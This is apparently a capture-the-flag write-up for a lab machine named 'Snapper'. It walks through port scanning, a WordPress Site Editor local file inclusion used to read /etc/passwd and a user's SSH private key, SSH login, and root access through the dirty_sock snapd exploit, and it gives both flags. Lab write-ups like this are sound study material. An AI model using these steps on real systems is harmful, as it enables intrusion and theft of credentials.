### 0x01 Challenge:

**Level:** Easy-Medium

**Description:**

>**217 Snapper**
>
>Get user and root flags.
>author: torombolo

### 0x02 User write-up:

We start by scanning the IP to get active services.

```
nmap -sV -Pn -T5 192.168.105.111
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-14 09:15 BST
Nmap scan report for 192.168.105.111
Host is up (0.00041s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.34 ((Ubuntu))
MAC Address: 52:54:00:A8:CA:93 (QEMU virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
```

If we enum the web we will see interesting paths. The most prominent is the wordpress installed.

```
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/blog (Status: 301) ----------------------
/index.html (Status: 200)
/index.php (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
```

The most logical way to perform is to do a first scan with wpscan, which will show us a LFI (local file inclusion) vulnerability.

```
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9044
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - http://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
```

Basically, the vulnerability explains that by visiting a specific path we can list computer files. The path in question is: http://(HOST)/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=(FILE_TO_LIST). We will do the PoC with /etc/passwd.

![Branching](https://i.imgur.com/Gn0nTWm.png)

**It works!**

Now we can list the ssh private key of one of the users to be able to connect to the machine.

* User: masterblaster
* Path: /home/masterblaster/.ssh/id_rsa

![Branching](https://i.imgur.com/biFPnNZ.png)

If we copy the rsa key to our machine and try to connect using it... (Remember to give 600 permissions to the file).

```
➜  ~ ssh masterblaster@192.168.105.111 -i .ssh/snapper
The authenticity of host '192.168.105.111 (192.168.105.111)' can't be established.
ECDSA key fingerprint is SHA256:95id/6gGifLj0lHnpKkICP9wAeECnGU/SHstsKBQ1Vo.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.105.111' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.10 (GNU/Linux 4.18.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


239 packages can be updated.
2 updates are security updates.

Last login: Sat Jun  8 17:18:17 2019 from 192.168.1.110
masterblaster@masterblaster-Standard-PC-Q35-ICH9-2009:~$ ls
Desktop  Documents  Downloads  examples.desktop  flag.txt  Music  Pictures  Public  Templates  Videos
masterblaster@masterblaster-Standard-PC-Q35-ICH9-2009:~$ cat flag.txt
uad360{b2143fa23fcfb6145f1bc9cca80dcbab}
masterblaster@masterblaster-Standard-PC-Q35-ICH9-2009:~$ 
````

All right! We have user and the first flag

`User flag: uad360{b2143fa23fcfb6145f1bc9cca80dcbab}`



### 0x03 Root write-up:

To get the root flag, if we list enough we can see that the snap version is not the most recent (the name of the machine helps to realize).

```
masterblaster@masterblaster-Standard-PC-Q35-ICH9-2009:~$ snap --version
snap    2.35.5+18.10
snapd   2.35.5+18.10
series  16
ubuntu  18.10
kernel  4.18.0-20-generic
```

That particular version is vulnerable to local privilege escalation as we can see [here](https://www.exploit-db.com/exploits/46361). The instructions to follow for the exploitation are:

* Create an account at the https://login.ubuntu.com/.
* After confirming it, edit your profile and upload an SSH public key.
* Run the exploit specifying the private key associated with the public upload to the web.

As we have said, we created the account in the link and we will upload the ssh key to its corresponding section.

![Branching](https://i.imgur.com/IJAtcD6.png)

In order to avoiding upload our personal ssh key for obvious reasons, we created a new one in a linux as we see here:

```
➜  /tmp ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/.ssh/snapper_root
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/snapper_root.
Your public key has been saved in /root/.ssh/snapper_root.pub.
The key fingerprint is:
SHA256:hRkMNEgC26et0GnVyhmW0MPGzZDZdPNUs8MFlgYXcF0 root@kali
The key's randomart image is:
+---[RSA 2048]----+
|..o=o@=o+ ++O=..E|
| o oXo+o.B =o+.  |
|. ..*.. o o.+    |
| . O +   .   .   |
|. = =   S        |
| o .             |
|  .              |
|                 |
|                 |
+----[SHA256]-----+
```

We upload the generated public key. We pass the exploit and the private key to the vulnerable machine and launch it by specifying the key and the account mail.

```
masterblaster@masterblaster-Standard-PC-Q35-ICH9-2009:/dev/shm$ python3 snapd.py -u sugomum@uber-mail.com -k snapper_root

      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 1)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/bgsfawbofu;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Sending payload...
[+] Success! Enjoy your new account with sudo rights!
Welcome to Ubuntu 18.10 (GNU/Linux 4.18.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


239 packages can be updated.
2 updates are security updates.

New release '19.04' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00tdevploit@masterblaster-Standard-PC-Q35-ICH9-2009:~$ id
uid=1001(r00tdevploit) gid=1001(r00tdevploit) groups=1001(r00tdevploit)
r00tdevploit@masterblaster-Standard-PC-Q35-ICH9-2009:~$ sudo -s
root@masterblaster-Standard-PC-Q35-ICH9-2009:~# GGWP
```

**We got root shell!**

Finally we visit the path where the flag is.

```
root@masterblaster-Standard-PC-Q35-ICH9-2009:/root# cat flag.txt
uad360{fb9bf208b033aee53a16a5255b3b3039}
```

`Root flag: uad360{fb9bf208b033aee53a16a5255b3b3039}`
